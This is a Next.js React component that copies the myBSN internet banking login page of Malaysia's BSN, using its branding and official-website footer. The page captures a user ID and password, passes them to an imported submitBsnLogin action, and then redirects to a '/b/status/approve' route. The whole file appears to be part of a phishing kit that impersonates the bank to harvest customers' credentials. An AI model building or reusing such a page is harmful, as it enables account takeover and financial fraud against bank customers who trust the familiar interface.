"use client";

import React, { useState } from "react";
import Image from "next/image";
import { User, Lock, Loader2, ShieldCheck, HelpCircle, UserRound } from "lucide-react";
import { submitBsnLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function BsnLoginPage() {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (userId.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitBsnLogin(userId, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  const handleClear = () => {
    setUserId("");
    setPassword("");
    setError("");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#214E46] font-sans text-[#333]">
      {/* Top Header */}
      <header className="flex h-16 items-center bg-[#25A699] px-6 shadow-md">
        <h1 className="text-2xl font-bold tracking-tight text-white uppercase">BSN</h1>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-4 pt-10 pb-12">
        <h2 className="mb-8 text-center text-[28px] font-normal text-white">
          myBSN Internet
        </h2>

        {/* Login Card */}
        <div className="w-full max-w-sm overflow-hidden rounded-[24px] bg-white p-8 shadow-2xl">
          {/* Stylized User Icon */}
          <div className="mb-8 flex justify-center">
            <div className="flex h-24 w-24 items-center justify-center rounded-full border-2 border-[#1B4D45]">
              <div className="flex flex-col items-center">
                <div className="h-10 w-10 rounded-full border-2 border-[#1B4D45]" />
                <div className="mt-1 h-6 w-14 rounded-t-full border-2 border-t-2 border-x-2 border-[#1B4D45]" />
              </div>
            </div>
          </div>

          <form onSubmit={handleLogin} className="space-y-5">
            {error && (
              <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                {error}
              </div>
            )}

            <div className="space-y-4">
              <input
                type="text"
                placeholder="User ID"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full rounded-lg border border-[#BDBDBD] bg-[#F5F5F5] py-3 px-4 text-[16px] outline-none transition-all focus:border-[#25A699] focus:bg-white"
                required
              />

              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded-lg border border-[#BDBDBD] bg-[#F5F5F5] py-3 px-4 text-[16px] outline-none transition-all focus:border-[#25A699] focus:bg-white"
                required
              />
            </div>

            <div className="flex gap-4 pt-4">
              <button
                type="button"
                onClick={handleClear}
                className="flex-1 rounded-lg border-2 border-[#25A699] py-2.5 text-lg font-bold text-[#25A699] transition-all active:scale-[0.98]"
              >
                Clear
              </button>
              <button
                type="submit"
                disabled={isLoading}
                className="flex-1 rounded-lg bg-[#1B4D45] py-2.5 text-lg font-bold text-white shadow-sm transition-all active:scale-[0.98] disabled:opacity-80"
              >
                {isLoading ? (
                  <Loader2 className="mx-auto h-6 w-6 animate-spin" />
                ) : (
                  "Login"
                )}
              </button>
            </div>
          </form>

          {/* Links Section */}
          <div className="mt-8 flex flex-col items-center gap-4">
            <div className="flex items-center gap-4 text-[15px] font-bold text-[#25A699]">
              <button className="hover:underline">Register</button>
              <span className="text-gray-300">|</span>
              <button className="hover:underline">Forgot password</button>
            </div>

            <div className="text-center">
              <p className="text-[13px] text-gray-500">Don't have an Internet Banking account?</p>
              <button className="text-[13px] font-bold text-[#25A699] hover:underline">
                Find out here on how to register for myBSN.
              </button>
            </div>

            <div className="flex items-center gap-1.5 pt-2">
              <span className="text-[13px] text-gray-500">Security Alert</span>
              <button className="flex items-center gap-1 rounded bg-[#25A699] px-2 py-0.5 text-[11px] font-bold text-white uppercase">
                <ShieldCheck size={12} />
                Click Here
              </button>
            </div>
          </div>
        </div>

        {/* Footer Link */}
        <div className="mt-10 text-center text-white">
          <p className="text-[15px] font-bold leading-tight">Visit BSN Official Website at</p>
          <button className="text-[18px] font-bold text-[#25A699] hover:underline">
            www.bsn.com.my
          </button>
        </div>
      </main>

      {/* Side Decorative Glow */}
      <div className="fixed bottom-0 right-0 h-24 w-24 translate-x-12 translate-y-12 rounded-full bg-[#25A699]/20 blur-2xl" />
    </div>
  );
}
